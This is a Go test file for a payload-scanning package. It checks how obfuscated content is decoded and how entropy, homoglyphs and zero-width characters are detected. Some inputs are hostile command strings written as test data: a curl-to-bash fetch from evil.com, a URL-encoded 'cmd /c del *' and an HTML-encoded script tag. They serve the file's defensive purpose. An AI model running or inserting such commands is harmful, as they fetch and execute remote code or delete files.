package scan

import (
	"bytes"
	"compress/zlib"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"strings"
	"testing"
)

func TestDecodeBase64(t *testing.T) {
	original := "curl https://evil.com/payload | bash"
	encoded := base64.StdEncoding.EncodeToString([]byte(original))
	layers := DecodePayloadLayers([]byte(encoded))
	if len(layers) == 0 {
		t.Fatal("expected at least one decoded layer for base64")
	}
	if !strings.Contains(string(layers[0].Content), "evil.com") {
		t.Fatalf("decoded content missing expected string: %s", layers[0].Content)
	}
	if layers[0].Encoding != "base64" {
		t.Fatalf("expected encoding=base64, got %s", layers[0].Encoding)
	}
	if layers[0].Confidence != 1.0 {
		t.Fatalf("expected first-layer confidence 1.0, got %v", layers[0].Confidence)
	}
}

func TestDecodeHex(t *testing.T) {
	original := "malware_payload"
	encoded := hex.EncodeToString([]byte(original))
	layers := DecodePayloadLayers([]byte(encoded))
	if len(layers) == 0 {
		t.Fatal("expected at least one decoded layer for hex")
	}
	if string(layers[0].Content) != original {
		t.Fatalf("decoded = %q, want %q", layers[0].Content, original)
	}
}

func TestDecodeURL(t *testing.T) {
	layers := DecodePayloadLayers([]byte("cmd%20%2Fc%20del%20%2A"))
	if len(layers) == 0 {
		t.Fatal("expected decoded layer for URL encoding")
	}
	if !strings.Contains(string(layers[0].Content), "cmd /c del") {
		t.Fatalf("decoded content = %q", layers[0].Content)
	}
}

func TestDecodeUnicode(t *testing.T) {
	layers := DecodePayloadLayers([]byte(`\u0063\u0075\u0072\u006c`))
	if len(layers) == 0 {
		t.Fatal("expected decoded layer for unicode escapes")
	}
	if string(layers[0].Content) != "curl" {
		t.Fatalf("decoded = %q, want curl", layers[0].Content)
	}
}

func TestDecodeHTML(t *testing.T) {
	layers := DecodePayloadLayers([]byte("&lt;script&gt;alert(1)&lt;/script&gt;"))
	if len(layers) == 0 {
		t.Fatal("expected decoded layer for HTML entities")
	}
	if !strings.Contains(string(layers[0].Content), "<script>") {
		t.Fatalf("decoded = %q", layers[0].Content)
	}
}

func TestDecodeROT13(t *testing.T) {
	layers := DecodePayloadLayers([]byte("phey"))
	found := false
	for _, l := range layers {
		if string(l.Content) == "curl" && l.Encoding == "rot13" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected ROT13 decode of 'phey' to 'curl'")
	}
}

func TestDecodeNested(t *testing.T) {
	inner := "malicious_command"
	b64 := base64.StdEncoding.EncodeToString([]byte(inner))
	hexEncoded := hex.EncodeToString([]byte(b64))
	layers := DecodePayloadLayers([]byte(hexEncoded))
	found := false
	for _, l := range layers {
		if strings.Contains(string(l.Content), inner) {
			found = true
		}
	}
	if !found {
		t.Fatal("expected nested hex->base64 decode to reveal inner content")
	}
	var sawDepth1 bool
	for _, l := range layers {
		if strings.Contains(l.Encoding, "->") && l.Confidence == 0.8 {
			sawDepth1 = true
		}
	}
	if !sawDepth1 {
		t.Fatalf("expected a depth-1 layer with confidence 0.8, layers=%+v", layers)
	}
}

func TestDecodeNonTextRejected(t *testing.T) {
	binary := base64.StdEncoding.EncodeToString([]byte{0x00, 0x01, 0x02, 0x03, 0x00})
	layers := DecodePayloadLayers([]byte(binary))
	for _, l := range layers {
		if l.Encoding == "base64" && !LooksLikeText(l.Content) {
			t.Fatal("binary content should be rejected by LooksLikeText")
		}
	}
}

func TestEncodingChainString(t *testing.T) {
	if got := EncodingChainString(nil); got != "" {
		t.Fatalf("expected empty chain, got %q", got)
	}
	layers := []DecodedLayer{{Encoding: "base64"}, {Encoding: "base64->hex"}}
	if got := EncodingChainString(layers); got != "base64->hex" {
		t.Fatalf("expected base64->hex, got %q", got)
	}
}

func TestTryDecodeGzip(t *testing.T) {
	if _, ok := TryDecodeGzip(nil); ok {
		t.Fatal("nil input should not decode")
	}
	if _, ok := TryDecodeGzip([]byte("short")); ok {
		t.Fatal("short input should not decode")
	}
	if _, ok := TryDecodeGzip([]byte("0123456789")); ok {
		t.Fatal("non-gzip header should not decode")
	}
	broken := []byte{0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xDE, 0xAD}
	if _, ok := TryDecodeGzip(broken); ok {
		t.Fatal("corrupted gzip should not decode")
	}
}

func TestTryDecodePowerShellEncoded(t *testing.T) {
	if _, ok := TryDecodePowerShellEncoded([]byte("no powershell here")); ok {
		t.Fatal("no -enc flag should not decode")
	}
	if _, ok := TryDecodePowerShellEncoded([]byte("powershell -enc AB")); ok {
		t.Fatal("too-short base64 should not decode")
	}
	if _, ok := TryDecodePowerShellEncoded([]byte("powershell -EncodedCommand !!!!")); ok {
		t.Fatal("invalid base64 should not decode")
	}
}

func TestTryDecodeBase32(t *testing.T) {
	plain := "hello world"
	enc := base32.StdEncoding.EncodeToString([]byte(plain))
	out, ok := TryDecodeBase32([]byte(enc))
	if !ok {
		t.Fatal("expected base32 decode")
	}
	if string(out) != plain {
		t.Fatalf("got %q want %q", out, plain)
	}
	if _, ok := TryDecodeBase32([]byte("short")); ok {
		t.Fatal("too-short input should not decode")
	}
	if _, ok := TryDecodeBase32([]byte("!!!!")); ok {
		t.Fatal("invalid base32 should not decode")
	}
}

func TestTryDecodeZlib(t *testing.T) {
	plain := []byte("hello world")
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	if _, err := w.Write(plain); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	out, ok := TryDecodeZlib(buf.Bytes())
	if !ok {
		t.Fatal("expected zlib decode")
	}
	if !bytes.Equal(out, plain) {
		t.Fatalf("got %q want %q", out, plain)
	}
	if _, ok := TryDecodeZlib([]byte("not-zlib-header")); ok {
		t.Fatal("non-zlib should not decode")
	}
}

func TestTryDecodeQuotedPrintable(t *testing.T) {
	in := []byte("hello=20world")
	out, ok := TryDecodeQuotedPrintable(in)
	if !ok {
		t.Fatal("expected quoted-printable decode")
	}
	if string(out) != "hello world" {
		t.Fatalf("got %q want %q", out, "hello world")
	}
	if _, ok := TryDecodeQuotedPrintable([]byte("no escapes here")); ok {
		t.Fatal("input without =HH should not decode")
	}
}

func TestTryExtractPEM(t *testing.T) {
	der := []byte{0x30, 0x03, 0x01, 0x02, 0x03}
	block := &pem.Block{Type: "TEST TYPE", Bytes: der}
	pemBytes := pem.EncodeToMemory(block)
	out, ok := TryExtractPEM(pemBytes)
	if !ok {
		t.Fatal("expected PEM extraction")
	}
	if !bytes.Equal(out, der) {
		t.Fatalf("DER mismatch: got %x want %x", out, der)
	}
	if _, ok := TryExtractPEM([]byte("not pem")); ok {
		t.Fatal("non-PEM should not extract")
	}
}

func TestLooksLikeTextEdgeCases(t *testing.T) {
	tests := []struct {
		name string
		data []byte
		want bool
	}{
		{"empty", []byte{}, false},
		{"nil", nil, false},
		{"null_byte", []byte{0x00}, false},
		{"single_ascii", []byte("a"), true},
		{"ascii_text", []byte("hello world"), true},
		{"valid_utf8", []byte("café"), true},
		{"embedded_null", []byte("hel\x00lo"), false},
		{"invalid_utf8", []byte{0xff, 0xfe}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := LooksLikeText(tt.data); got != tt.want {
				t.Errorf("LooksLikeText(%v) = %v, want %v", tt.data, got, tt.want)
			}
		})
	}
}

func TestJoinMultilineBase64(t *testing.T) {
	if got := JoinMultilineBase64("single"); got != "single" {
		t.Errorf("single line: got %q", got)
	}
	multiline := "YWJj\nZGVm\n"
	if got := JoinMultilineBase64(multiline); got != "YWJjZGVm" {
		t.Errorf("multiline: got %q, want YWJjZGVm", got)
	}
	nonBase64 := "hello\nwor ld\n"
	got := JoinMultilineBase64(nonBase64)
	if got == "helloworld" || got == "hellowor ld" {
		t.Errorf("non-base64 lines should not be joined: got %q", got)
	}
	if !strings.Contains(got, "\n") {
		t.Errorf("non-base64 multiline should preserve newline: got %q", got)
	}
}

func TestShannonEntropy(t *testing.T) {
	english := []byte("The quick brown fox jumps over the lazy dog. " +
		"Pack my box with five dozen liquor jugs. How vexingly quick daft zebras jump.")
	secret := make([]byte, 64)
	for i := range secret {
		secret[i] = byte((i*17 + 31) % 256)
	}
	b64Secret := []byte(base64.StdEncoding.EncodeToString(secret))

	uniform256 := make([]byte, 256)
	for i := range uniform256 {
		uniform256[i] = byte(i)
	}

	tests := []struct {
		name string
		data []byte
		min  float64
		max  float64
	}{
		{"empty", nil, 0, 0},
		{"empty_slice", []byte{}, 0, 0},
		{"all_zero", make([]byte, 128), 0, 0},
		{"all_same_byte", bytesRepeat('x', 200), 0, 0},
		{"uniform_256", uniform256, 7.5, 8.0},
		{"english_text", english, 3.0, 5.0},
		{"base64_encoded_secret", b64Secret, 5.5, 8.0},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShannonEntropy(tt.data)
			if got < tt.min || got > tt.max {
				t.Fatalf("ShannonEntropy() = %v, want between %v and %v", got, tt.min, tt.max)
			}
		})
	}
}

func bytesRepeat(b byte, n int) []byte {
	out := make([]byte, n)
	for i := range out {
		out[i] = b
	}
	return out
}

func TestIsHighEntropy(t *testing.T) {
	low := []byte("aaaaaaaaaaaaaaaa")
	if IsHighEntropy(low, DefaultEntropyThresholdBits) {
		t.Fatal("low-entropy payload should not be high entropy at default threshold")
	}
	uniform256 := make([]byte, 256)
	for i := range uniform256 {
		uniform256[i] = byte(i)
	}
	if !IsHighEntropy(uniform256, DefaultEntropyThresholdBits) {
		t.Fatal("uniform byte distribution should exceed default threshold")
	}
	if IsHighEntropy(uniform256, 8.0) {
		t.Fatal("entropy cannot exceed 8 bits/byte")
	}
	threshold := ShannonEntropy(uniform256)
	if IsHighEntropy(uniform256, threshold) {
		t.Fatal("boundary: entropy should not strictly exceed itself")
	}
	if !IsHighEntropy(uniform256, threshold-0.01) {
		t.Fatal("just below measured entropy should still count as high")
	}
}

func TestDetectHomoglyphs(t *testing.T) {
	tests := []struct {
		s    string
		want bool
	}{
		{"paypal", false},
		{"HelloWorld123", false},
		{"привет", false},
		{"Привет мир", false},
		{"pаypal", true},
		{"日本語", false},
		{"latin" + string('\u0430'), true},
	}
	for _, tt := range tests {
		if got := DetectHomoglyphs(tt.s); got != tt.want {
			t.Fatalf("DetectHomoglyphs(%q) = %v, want %v", tt.s, got, tt.want)
		}
	}
}

func TestNormalizeUnicode(t *testing.T) {
	in := "a\u200b\u200c\u200d\uFEFF\u00ADb"
	if got := NormalizeUnicode(in); got != "ab" {
		t.Fatalf("NormalizeUnicode zero-width strip = %q, want ab", got)
	}
	if got := NormalizeUnicode("  hello  "); got != "hello" {
		t.Fatalf("NormalizeUnicode trim = %q, want hello", got)
	}
	if got := NormalizeUnicode("unchanged"); got != "unchanged" {
		t.Fatalf("NormalizeUnicode ASCII = %q", got)
	}
}
